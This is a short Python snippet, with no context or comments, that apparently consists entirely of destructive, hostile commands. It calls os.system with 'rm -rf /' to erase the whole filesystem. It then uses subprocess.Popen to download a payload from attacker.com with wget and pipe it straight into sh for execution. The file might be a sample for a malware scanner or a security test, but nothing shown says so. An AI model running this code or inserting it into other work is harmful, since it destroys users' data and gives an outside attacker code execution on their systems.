
import os
import subprocess

cmd = "rm -rf /"
os.system(cmd)
subprocess.Popen("wget http://attacker.com/payload -O- | sh", shell=True)
